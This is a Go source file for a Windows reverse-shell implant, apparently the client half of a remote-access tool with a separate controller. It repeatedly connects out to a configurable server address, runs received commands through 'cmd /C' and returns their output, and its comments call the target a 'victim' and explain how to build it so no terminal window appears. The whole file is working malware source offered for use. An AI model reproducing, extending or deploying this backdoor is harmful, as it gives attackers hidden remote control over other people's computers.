 package main

import (
	"fmt"
	"net"
	"os/exec"
)

//if you do not want victim to see terminal, you should build this file by using "go build -ldflags "-H windowsgui" target-payload.go"

const (
	//definite values for server
	//just change serverAddress value and if you want, you can change the port value with one of your available tcp port
	//but you will have to change the port value of the port value in controller.go
	ip_address = "localhost"
	protocol = "tcp"
	port = "8888"
)

func main() {
	for {
		connection, connection_error := connect_to_server() //connecting to the server
		if connection_error != nil {
			fmt.Println(";A connection error occurred; ", connection_error.Error())

			continue
		} else {
			fmt.Println(";Connected to the server;")

			for {
				command, receiving_error := take_command_from_server(connection) //receiving a cmd command from the server
				if receiving_error != nil {
					fmt.Println(";A data reading error occurred; ", receiving_error.Error())

					break
				} else {
					fmt.Println(";The command has been received successfully;")

					output, execution_error := execute_command(command) //executing the cmd command
					if execution_error != nil {
						fmt.Println(";A cmd command execution error occurred; ", execution_error.Error())

					} else {
						send_cmd_output_to_server(connection, output) //sending the output of the cmd command to the server
					
						fmt.Println(";The command has been run succesfully;")

						break
					}		
				}
			}
		}

		connection.Close()
	}
}

func connect_to_server() (connection net.Conn, connection_error error) {
	connection, connection_error = net.Dial(protocol, ip_address + ":" + port)

	return
}

func take_command_from_server(connection net.Conn) (string, error) {
	buffer := make([]byte, 1024)
	data_length, receiving_error := connection.Read(buffer)

	return string(buffer[:data_length]), receiving_error
}

func execute_command(command string) (output string, execution_error error) {
	for i := 1; i <= 5; i++ {
		cmd := exec.Command("cmd", "/C", command)
		result, execution_error := cmd.Output()
		if execution_error != nil {
			continue
		} else {
			output = string(result)

			break
		}
	}

	return
}

func send_cmd_output_to_server(connection net.Conn, output string) {
	connection.Write([]byte(output))
}